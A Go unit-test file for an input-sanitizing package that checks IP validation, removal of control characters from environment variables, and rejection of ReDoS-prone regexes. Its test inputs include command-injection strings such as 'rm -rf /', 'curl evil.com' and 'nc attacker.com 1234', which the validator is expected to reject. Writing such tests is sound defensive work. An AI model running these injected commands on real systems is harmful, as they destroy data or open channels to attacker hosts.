package sanitize

import (
	"testing"
)

func TestIP(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		// Valid IPs
		{"valid ipv4", "192.168.1.1", "192.168.1.1"},
		{"valid ipv4 with leading zero", "192.168.001.1", "192.168.001.1"},
		{"localhost", "127.0.0.1", "127.0.0.1"},
		{"valid ipv6", "2001:0db8:85a3:0000:0000:8a2e:0370:7334", "2001:0db8:85a3:0000:0000:8a2e:0370:7334"},
		{"valid ipv6 short", "::1", "::1"},
		{"valid ipv6 compressed", "2001:db8::1", "2001:db8::1"},

		// Command injection attempts
		{"command injection semicolon", "192.168.1.1; rm -rf /", ""},
		{"command injection ampersand", "192.168.1.1 && curl evil.com", ""},
		{"command injection pipe", "192.168.1.1 | nc attacker.com 1234", ""},
		{"command injection backtick", "192.168.1.1`whoami`", ""},
		{"command injection dollar", "192.168.1.1$(whoami)", ""},
		{"command injection redirect", "192.168.1.1 > /etc/passwd", ""},
		{"command injection redirect in", "192.168.1.1 < /etc/passwd", ""},
		{"command injection parentheses", "192.168.1.1()", ""},
		{"command injection braces", "192.168.1.1{}", ""},
		{"command injection brackets", "192.168.1.1[]", ""},
		{"command injection backslash", "192.168.1.1\\nrm -rf", ""},
		{"command injection exclamation", "192.168.1.1!important", ""},

		// Malformed IPs
		{"empty string", "", ""},
		{"invalid format", "999.999.999.999", ""},
		{"letters in ip", "192.168.abc.1", ""},
		{"incomplete ip", "192.168.1", ""},
		{"too many octets", "192.168.1.1.1", ""},

		// Whitespace handling
		{"whitespace prefix", "  192.168.1.1", "192.168.1.1"},
		{"whitespace suffix", "192.168.1.1  ", "192.168.1.1"},
		{"whitespace both", "  192.168.1.1  ", "192.168.1.1"},
		{"embedded space", "192.168. 1.1", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := IP(tt.input)
			if got != tt.want {
				t.Errorf("IP(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestEnvVar(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"normal string", "hello world", "hello world"},
		{"string with newline", "hello\nworld", "helloworld"},
		{"string with null byte", "hello\x00world", "helloworld"},
		{"string with carriage return", "hello\rworld", "helloworld"},
		{"string with tab", "hello\tworld", "hello\tworld"}, // tabs are allowed
		{"string with bell", "hello\x07world", "helloworld"},
		{"multiple control chars", "hello\n\r\x00world", "helloworld"},
		{"empty string", "", ""},
		{"only control chars", "\n\r\x00", ""},
		// Note: input is all null bytes, which are control chars that get removed
		{"long string truncated", string(make([]byte, 5000)), ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := EnvVar(tt.input)
			if got != tt.want {
				t.Errorf("EnvVar(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestValidateRegex(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		wantErr bool
	}{
		// Safe patterns
		{"simple literal", "hello", false},
		{"simple pattern", "hello.*world", false},
		{"character class", "[a-z]+", false},
		{"anchored", "^start.*end$", false},
		{"digit pattern", "\\d{1,3}", false},

		// Dangerous patterns (ReDoS)
		{"nested star quantifiers", "(.*)*", true},
		{"nested plus quantifiers", "(.+)+", true},
		{"nested quantifiers mixed", "(.*)+", true},
		{"nested quantifiers mixed 2", "(.+)*", true},
		{"nested quantifiers same char", "(a*)*", true},
		{"nested quantifiers same char plus", "(a+)+", true},
		{"alternation overlap", "(a|a)*", true},
		{"alternation overlap 2", "(a|ab)*", true},

		// Invalid regex
		{"unclosed paren", "hello(world", true},
		{"invalid escape", "hello\\", true},

		// Too long
		{"extremely long", string(make([]byte, 1001)), true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateRegex(tt.pattern)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateRegex(%q) error = %v, wantErr %v", tt.pattern, err, tt.wantErr)
			}
		})
	}
}

// Benchmark to ensure IP validation is fast
func BenchmarkIP(b *testing.B) {
	tests := []string{
		"192.168.1.1",
		"192.168.1.1; rm -rf /",
		"2001:db8::1",
		"invalid",
	}

	for i := 0; i < b.N; i++ {
		for _, test := range tests {
			IP(test)
		}
	}
}

// Benchmark to ensure EnvVar sanitization is fast
func BenchmarkEnvVar(b *testing.B) {
	input := "Feb  2 12:34:56 host sshd[1234]: Failed password for invalid user admin from 192.168.1.1 port 22 ssh2"

	for i := 0; i < b.N; i++ {
		EnvVar(input)
	}
}
